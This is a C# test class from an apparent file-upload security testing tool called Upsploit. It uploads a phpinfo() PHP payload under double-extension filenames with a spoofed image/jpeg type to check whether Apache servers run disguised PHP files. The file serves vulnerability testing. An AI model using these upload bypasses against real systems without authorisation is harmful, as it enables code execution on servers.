using System.Text;
using System.Threading.Tasks;

/*
* Test #6
* Description: This test tries different combinations of double-extensions.
* Different double extension tests will work based on certain server configs.
*/
namespace Upsploit.Tests {
    class Test06 : Test {
        public override sealed string description { get; set; }
        public override sealed string validation { get; set; }

        public Test06(){
            description = "This test uploads three files with the MIME type \"image/jpeg\".\r\n" +
                          "The files uploaded are \"Test_6.php.123\", \"Test_6.jpg.php\" and \"Test_6.php.jpg\"." +
                          "\r\n\r\n" +
                          "The files all test different configurations on the server, not all of them will be recognized as php files" +
                          "by the browser.";

            validation = "Look for \"Test_6.php.123\", \"Test_6.jpg.php\" and \"Test_6.php.jpg\" on the web application. " +
                         "If any of these pages display the phpinfo, the test was a success and the web application is vulnerable.\r\n\r\n" +
                         "If the webpage no longer has the correct extension or it doesn't render in the browser, the test failed.";
        }

        internal override async Task runTest(UploadRequest.UploadRequest request) {
            const string data = "<?php\n"
                            + "  echo phpinfo();\n"
                            + "?>";

            request.setFileData(Encoding.ASCII.GetBytes(data));
            request.setFileContentType("image/jpeg");

            //Test for validation of just the final extension (Apache will use the real extension for the MIME type)
            request.setFileName("Test_6.php.123");
            await request.send();
            printResult(request, "Test 06 (first extension)");

            //Test for validation of just the first extension (Apache will use the last extension for the MIME type if they're all real)
            request.setFileName("Test_6.jpg.php");
            await request.send();
            printResult(request, "Test 06 (last extension)");

            //Test for "AddHandler" directive for php files (This will make Apache recognize the file as PHP no matter where the extension is)
            request.setFileName("Test_6.php.jpg");
            await request.send();
            printResult(request, "Test 06 (AddHandler test)");
        }
    }
}
